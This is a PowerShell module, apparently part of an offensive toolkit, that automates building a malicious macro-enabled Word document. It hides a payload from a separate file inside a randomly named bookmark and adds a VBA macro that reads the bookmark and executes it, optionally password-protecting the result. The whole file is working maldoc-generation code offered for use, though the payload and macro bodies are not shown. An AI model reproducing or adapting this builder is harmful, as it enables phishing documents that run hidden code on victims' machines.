Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

This module will create a word document and set a bookmark to a string of text

that bookmark will then be used as a variable and passed to an exec function for
code execution

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $bookmarkName = RandTextAlpha -len 15
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Style = "Title"
    $wdApp.Selection.TypeText("This is the Title")
    $wdApp.Selection.TypeParagraph()

    $wdApp.Selection.Bookmarks.Add($bookmarkName)  | Out-Null
    $bookmark = $wdApp.Selection.Bookmarks._NewEnum | Where-Object { $_.Name -eq $bookmarkName }
    $wdApp.Selection.TypeText($payload)
    $bookmark.End = $bookmark.End + $payload.Length

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)
    $macro = BuildMacro -name $bookmarkName
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 
    
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [System.Object]
        $name
    )

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")
    $macro = $macro -replace "aBOOKMARKa", $name

    return $macro

}